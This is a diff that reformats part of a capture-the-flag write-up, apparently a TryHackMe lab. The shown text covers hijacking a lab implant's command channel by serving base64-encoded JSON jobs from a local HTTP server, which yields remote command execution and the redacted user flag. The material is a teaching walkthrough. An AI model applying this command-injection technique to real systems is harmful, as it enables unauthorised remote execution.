@@ -65,7 +65,7 @@ We're receiving an HTTP GET call to a `heartbeat` endponit and a long filename t
 
 Let's start an HTTP server so that we can respond to the GET. 
 
-<span style="background-color: #FFFF00">
+```bash
 ┌──(user㉿kali-linux-2022-2)-[~]
 └─$ python -m http.server 81
 Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
@@ -77,7 +77,7 @@ Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
 10.10.115.84 - - [02/Aug/2023 17:17:01] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDJUMjE6MTc6MDEuNjUwODk3IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 404 -                                            
 10.10.115.84 - - [02/Aug/2023 17:17:03] code 404, message File not found                                        
 10.10.115.84 - - [02/Aug/2023 17:17:03] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 -
-</span>
+```
 
 Soon after starting the server we see calls coming in for the  `heartbeat` endponit as well as a new one to `get-job`. The filename at the end of the `get-job` endponit decodes to `"latest"`, suggesting we can provide new job instructions here. 
 
@@ -98,7 +98,10 @@ After a brief wait we see the implant call our file, followed by a second call t
 10.10.115.84 - - [02/Aug/2023 17:31:02] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ==
 ```
 
-Decoding the base 64 we see `{"success": false, "result": "Encoding error"}`
+Decoding the base 64 we see 
+```json
+{"success": false, "result": "Encoding error"}
+```
 
 OK, so it wants base 64. On the next round we'll encode the payload:
 
@@ -106,7 +109,9 @@ OK, so it wants base 64. On the next round we'll encode the payload:
 
 The implant reads this and returns:
 
-`{"success": false, "result": "JSON error"}`
+```json
+{"success": false, "result": "JSON error"}
+```
 
 Now it wants JSON. At least we're moving forward! Let’s try the JSON format we received in the heartbeat message. We submit:
 
@@ -114,7 +119,9 @@ Now it wants JSON. At least we're moving forward! Let’s try the JSON format we
 
 With this we get back:
 
-`{"job_id": 0, "cmd": "ls", "success": true, "result": "products.py\nuser.txt\n"}`
+```json
+{"job_id": 0, "cmd": "ls", "success": true, "result": "products.py\nuser.txt\n"}
+```
 
 We've achieved RCE and found the first flag already, let's grab it right now!
 
@@ -124,7 +131,9 @@ Send:
 
 Receive:
 
-`{"job_id": 0, "cmd": "cat user.txt", "success": true, "result": "THM{[redacted]}\n"}`
+```json
+{"job_id": 0, "cmd": "cat user.txt", "success": true, "result": "THM{[redacted]}\n"}`
+```
 
 ## Initial Shell
 
